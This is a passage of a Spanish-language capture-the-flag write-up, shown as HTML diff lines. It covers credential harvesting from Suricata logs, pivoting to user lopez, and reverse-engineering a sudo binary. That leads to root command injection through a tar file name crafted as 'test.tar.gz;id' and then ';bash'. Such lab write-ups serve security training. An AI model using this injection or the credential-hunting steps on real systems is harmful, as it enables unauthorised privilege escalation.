+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 fast.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 fast.log.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Oct <span style="color:#ff0;font-weight:bold">26</span>  <span style="color:#ff0;font-weight:bold">2023</span> fast.log.1-2024040114.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr  <span style="color:#ff0;font-weight:bold">8</span> 14:19 fast.log.1-2024042213.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">22</span> 13:26 fast.log.1-2024042918.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">29</span> 18:27 fast.log.1-2024072915.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root         <span style="color:#ff0;font-weight:bold">20</span> Oct <span style="color:#ff0;font-weight:bold">26</span>  <span style="color:#ff0;font-weight:bold">2023</span> fast.log.5.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root       <span style="color:#ff0;font-weight:bold">1033</span> Oct  <span style="color:#ff0;font-weight:bold">8</span>  <span style="color:#ff0;font-weight:bold">2023</span> fast.log.7.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root       <span style="color:#ff0;font-weight:bold">1485</span> Sep <span style="color:#ff0;font-weight:bold">28</span>  <span style="color:#ff0;font-weight:bold">2023</span> fast.log.8.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 stats.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root    <span style="color:#ff0;font-weight:bold">7741988</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 stats.log.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root    <span style="color:#ff0;font-weight:bold">4293890</span> Oct <span style="color:#ff0;font-weight:bold">26</span>  <span style="color:#ff0;font-weight:bold">2023</span> stats.log.1-2024040114.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr  <span style="color:#ff0;font-weight:bold">8</span> 14:19 stats.log.1-2024042213.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">22</span> 13:26 stats.log.1-2024042918.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Apr <span style="color:#ff0;font-weight:bold">29</span> 18:27 stats.log.1-2024072915.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">73561</span> Oct <span style="color:#ff0;font-weight:bold">28</span>  <span style="color:#ff0;font-weight:bold">2023</span> stats.log.5.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root     <span style="color:#ff0;font-weight:bold">376680</span> Oct <span style="color:#ff0;font-weight:bold">14</span>  <span style="color:#ff0;font-weight:bold">2023</span> stats.log.7.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">67778</span> Sep <span style="color:#ff0;font-weight:bold">29</span>  <span style="color:#ff0;font-weight:bold">2023</span> stats.log.8.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root          <span style="color:#ff0;font-weight:bold">0</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 suricata.log
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">26867</span> Jul <span style="color:#ff0;font-weight:bold">29</span> 15:08 suricata.log.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root       <span style="color:#ff0;font-weight:bold">3893</span> Oct <span style="color:#ff0;font-weight:bold">26</span>  <span style="color:#ff0;font-weight:bold">2023</span> suricata.log.1-2024040114.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">68355</span> Apr  <span style="color:#ff0;font-weight:bold">8</span> 14:19 suricata.log.1-2024042213.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">95100</span> Apr <span style="color:#ff0;font-weight:bold">22</span> 13:26 suricata.log.1-2024042918.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root      <span style="color:#ff0;font-weight:bold">26145</span> Apr <span style="color:#ff0;font-weight:bold">29</span> 18:27 suricata.log.1-2024072915.backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root        <span style="color:#ff0;font-weight:bold">990</span> Apr  <span style="color:#ff0;font-weight:bold">1</span> 14:50 suricata.log.5.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root       <span style="color:#ff0;font-weight:bold">1412</span> Oct <span style="color:#ff0;font-weight:bold">19</span>  <span style="color:#ff0;font-weight:bold">2023</span> suricata.log.7.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>-rw-r--r--  <span style="color:#ff0;font-weight:bold">1</span> root root       <span style="color:#ff0;font-weight:bold">5076</span> Oct  <span style="color:#ff0;font-weight:bold">8</span>  <span style="color:#ff0;font-weight:bold">2023</span> suricata.log.8.gz</span></span></code></pre></div>
+<p>Con zgrep podemos filtrar por palabras que nos interesen como <code>user</code> y <code>pass</code>
+<code>zgrep -i -w pass ./*.gz | less</code></p>
+<p>Y podemos detectar una supuesta credencial en el fichero <code>eve.json</code> -&gt; <code>Lopezzz1992%123</code>
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<p>También podemos ver que esa solicitud fue respondida con un <code>Authentication failed</code></p>
+<p>Un poco mas abajo vemos la supuesta contraseña válida.
+<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
+<p>Existe un usuario <code>lopez</code> en el sistema, por lo cual podemos intentar pivotar a este usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/log/suricata$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>adam:x:1002:1002:,,,:/home/adam:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>lopez:x:1003:1003:,,,:/home/lopez:/bin/bash</span></span></code></pre></div>
+<p>¡Somos <code>lopez</code>!</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>dev_acc@intuition:/var/log/suricata$ su lopez
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>lopez@intuition:/var/log/suricata$</span></span></code></pre></div>
+<p>Podemos ejecutar como cualquier usuario el binario <code>runner2</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/var/log/suricata$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[sudo] password <span style="color:#fff;font-weight:bold">for</span> lopez: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Matching Defaults entries <span style="color:#fff;font-weight:bold">for</span> lopez on intuition:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    secure_path=/usr/local/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/local/bin<span style="color:#0ff;font-weight:bold">\:</span>/usr/sbin<span style="color:#0ff;font-weight:bold">\:</span>/usr/bin<span style="color:#0ff;font-weight:bold">\:</span>/sbin<span style="color:#0ff;font-weight:bold">\:</span>/bin<span style="color:#0ff;font-weight:bold">\:</span>/snap/bin,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>    use_pty
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>User lopez may run the following commands on intuition:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">9</span><span>    (ALL : ALL) /opt/runner2/runner2</span></span></code></pre></div>
+<h1 id="local-privilege-escalation">Local Privilege Escalation</h1>
+<h2 id="ingeniería-inversa-al-binario-runner2">Ingeniería inversa al binario runner2</h2>
+<p>Me pide un archivo <code>json</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/var/log/suricata$ sudo /opt/runner2/runner2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Usage: /opt/runner2/runner2 &lt;json_file&gt;</span></span></code></pre></div>
+<p>Si creamos un comprimido con un archivo json vacío y se lo pasamos al binario..</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 /tmp/test.tar.gz 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Error parsing JSON data.</span></span></code></pre></div>
+<p>Como por detrás se está usando ansible-playbooks, podemos deducir que para la gestión de este comprimido se está utilizando ansible-galaxy</p>
+<p>Abriendo el binario con ghidra vemos la estructura que debe de tener el archivo .json mas o menos.
+<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
+<p>Sabemos que tiene que tener un atributo <code>run</code> y <code>action</code>
+<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
+<p>Dentro del atributo <code>run</code> vemos que tiene que tener un atributo <code>auth_code</code> que suponemos que es el mismo que para el binario <code>runner1</code>
+<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
+<p>Y dentro el atributo <code>run</code> , si la <code>action</code> es <code>install</code> , debe de haber otro atributo llamado <code>role_file</code>
+<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
+<p>Si todo sale bien se llama al método <code>installRole</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span><span style="color:#007f7f">// InstallRole Method
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> installRole(undefined8 param_1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>  <span style="color:#fff;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>  <span style="color:#fff;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>  <span style="color:#fff;font-weight:bold">char</span> local_418 [<span style="color:#ff0;font-weight:bold">1032</span>];
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>  <span style="color:#fff;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>  local_10 = *(<span style="color:#fff;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#ff0;font-weight:bold">0x28</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>  iVar1 = isTarArchive(param_1);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>  <span style="color:#fff;font-weight:bold">if</span> (iVar1 == <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>    fwrite(<span style="color:#0ff;font-weight:bold">&#34;Invalid tar archive.</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>,<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">0x15</span>,stderr);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>  <span style="color:#fff;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>    snprintf(local_418,<span style="color:#ff0;font-weight:bold">0x400</span>,<span style="color:#0ff;font-weight:bold">&#34;%s install %s&#34;</span>,<span style="color:#0ff;font-weight:bold">&#34;/usr/bin/ansible-galaxy&#34;</span>,param_1);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>    system(local_418);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>  <span style="color:#fff;font-weight:bold">if</span> (local_10 != *(<span style="color:#fff;font-weight:bold">long</span> *)(in_FS_OFFSET + <span style="color:#ff0;font-weight:bold">0x28</span>)) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>                    <span style="color:#007f7f">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>  }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>  <span style="color:#fff;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>}</span></span></code></pre></div>
+<p>Este método requiere un archivo .tar y le pasa al binario /usr/bin/ansible-galaxy el parámetro que recibe el método.
+En este caso es lo que esté en el atributo <code>role_file</code></p>
+<p><img src="images/Screenshot_28.png" alt="Write-up Image"></p>
+<p>Por lo cual si en el <code>role_file</code> incluimos un archivo .tar válido y acto seguimos inyectamos un comando, podríamos ejecutar un comando como el usuario <code>root</code>.</p>
+<p>En el archivo se realiza una válidación del archivo .tar, por lo cual podemos crear un archivo .tar que se llame &ldquo;loquesea.tar.gz;id&rdquo; y así inyectar el comando.</p>
+<p>Así habría quedado el archivo .json</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>{
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>  <span style="font-weight:bold">&#34;run&#34;</span>: {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    <span style="font-weight:bold">&#34;action&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;install&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    <span style="font-weight:bold">&#34;role_file&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;/tmp/test.tar.gz;id&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>  },
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>  <span style="font-weight:bold">&#34;auth_code&#34;</span>: <span style="color:#0ff;font-weight:bold">&#34;UHI75GHINKOP&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>}</span></span></code></pre></div>
+<p>Ahora creamos el archivo .tar</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/tmp$ tar -cvf test.tar.gz test.json 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>test.json</span></span></code></pre></div>
+<h2 id="inyectando-un-comando-como-root">Inyectando un comando como <code>root</code></h2>
+<p>Ahora cambiamos el nombre al archivo .tar</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/tmp$ mv <span style="color:#0ff;font-weight:bold">&#34;test.tar.gz&#34;</span> <span style="color:#0ff;font-weight:bold">&#34;test.tar.gz;id&#34;</span></span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>lopez@intuition:/tmp$ sudo /opt/runner2/runner2 test.json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Starting galaxy role install process
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>[WARNING]: - /tmp/test.tar.gz was NOT installed successfully: Unknown error when
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>attempting to call Galaxy at <span style="color:#0ff;font-weight:bold">&#39;https://galaxy.ansible.com/api/&#39;</span>: &lt;urlopen error [Errno -3]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Temporary failure in name resolution&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>ERROR! - you can use --ignore-errors to skip failed roles and finish processing the list.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>uid=0(root) gid=0(root) groups=0(root)</span></span></code></pre></div>
+<p>Y se acontece la inyección del comando <code>id</code> y se ejecuta como el usuario <code>root</code></p>
+<p>Ahora para conseguir una bash, cambiamos el nombre del archivo a <code>test.tar.gz;bash</code></p>
+
+
+
+
+
+
